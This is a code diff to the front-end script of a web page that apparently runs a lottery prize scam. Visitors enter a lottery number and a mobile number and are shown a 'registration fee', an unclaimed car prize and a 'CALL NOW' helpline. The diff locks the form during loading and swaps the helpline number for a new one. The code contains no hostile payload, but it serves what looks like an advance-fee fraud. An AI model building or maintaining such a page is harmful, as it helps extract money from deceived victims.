@@ -3,6 +3,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
   
   document.getElementById('loader').style.display = 'block';
   document.getElementById('container').style.opacity = '0.5';
+  document.getElementById('lotteryNumber').disabled = true;
+  document.getElementById('mobileNumber').disabled = true;
+  document.getElementById('submit').disabled = true;
   
   const lotteryNumber = document.getElementById('lotteryNumber').value;
   const mobileNumber = document.getElementById('mobileNumber').value;
@@ -30,6 +33,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         document.getElementById('loader').style.display = 'none';
         document.getElementById('container').style.opacity = '1';
         document.getElementById("loginMessage").style.display = "inline-block";
+        document.getElementById('lotteryNumber').disabled = false;
+        document.getElementById('mobileNumber').disabled = false;
+        document.getElementById('submit').disabled = false;
         alert('Details not found. Please check your details.');
         document.getElementById("loginMessage").innerText = "Invalid Details";
         document.getElementById("loginMessage").style.backgroundColor = "red";
@@ -51,7 +57,7 @@ function displayDetails(userDetails) {
     <p>Registration Fees: RS. ${userDetails.registrationCharge}</p>
     <p>Prize Status: <span style="color: red;">Not Claimed</span></p>
     <img src="car.jpeg" style="width: 100%; border-radius: 5px; pointer-events: none;">
-    <p style="font-size: 14px">*For Any Questions or Concerns, You Can Call Helpline No. +91 6909425653.</p>
-    <a href = "tel:+916909425653" style = "padding: 5px 10px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px;">CALL NOW</a>
+    <p style="font-size: 14px">*For Any Questions or Concerns, You Can Call Helpline No. +91 7074322989.</p>
+    <a href = "tel:+917074322989" style = "padding: 5px 10px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px;">CALL NOW</a>
   `;
 }
